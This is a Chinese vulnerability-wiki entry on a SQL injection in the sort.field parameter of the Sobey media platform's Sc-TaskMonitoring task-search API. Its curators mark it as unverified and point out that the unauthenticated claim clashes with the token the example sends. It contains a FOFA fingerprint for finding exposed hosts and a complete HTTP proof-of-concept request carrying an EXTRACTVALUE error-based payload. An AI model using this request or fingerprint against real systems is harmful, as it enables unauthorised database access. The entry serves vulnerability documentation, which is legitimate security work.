---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "索贝融媒体 Sc-TaskMonitoring task/search sort.field SQL 注入"
product: "索贝融媒体"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，MySQL EXTRACTVALUE"
prerequisites: "匿名声称但请求带token"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E7%B4%A2%E8%B4%9D%E8%9E%8D%E5%AA%92%E4%BD%93/%E7%B4%A2%E8%B4%9D%E8%9E%8D%E5%AA%92%E4%BD%93%20Sc-TaskMonitoringresttasksearch%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "icon_hash=\"689611853\""
fofa_unverified: "icon_hash="
id: "vw-19feadd561336e046d233922"
entity_id: "ve-19feadd561336e046d233922"
schema_version: "1"
---

# 索贝融媒体 Sc-TaskMonitoring task/search sort.field SQL 注入

## 条目说明

- 对象与具体问题：索贝融媒体；Sc-TaskMonitoring task/search sort.field SQLi
- 版本、配置及部署条件：版本未知，MySQL EXTRACTVALUE
- 认证与权限前提：匿名声称但请求带token
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 未授权结论与携带有效token示例不相符，需无凭据对照
- 常量报错检测仅证明表达式执行线索，不能单凭其宣称数据库泄露到写木马
- 在野利用和修复版本无证据

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

索贝融媒体 Sc-TaskMonitoring/rest/task/search 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 此漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## 影响版本

索贝融媒体

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

> 归档原表（原作者主张，未独立核验）：上表记录本库当前核验边界；下表保留归档中的公开情况和在野利用声明，不能据此认定本库已验证。
>
> | 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
> |------|-------|-------|------|
> | 是 | 已公开 | 已公开 | 已知 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：icon_hash="689611853"

POC/EXP：

```http
POST /Sc-TaskMonitoring/rest/task/search HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Content-Type: application/json
Cookie: token=5ab95532238da1b7d9eb20de7ecef90e; siteCode=S1
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

{"page":1,"search":{"assignedCodes":""},"size":10,"date":{},"sort":{"field":"1 AND EXTRACTVALUE(8342,CONCAT(0x7e,0x7171787171,(SELECT (ELT(8342=8342,1))),0x716b706b71,0x7e))","desc":true}}
```


![image-20241121165551118](./.resource/索贝融媒体Sc-TaskMonitoringresttasksearchSQL注入漏洞/media/image-20241121165551118.png)


## 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
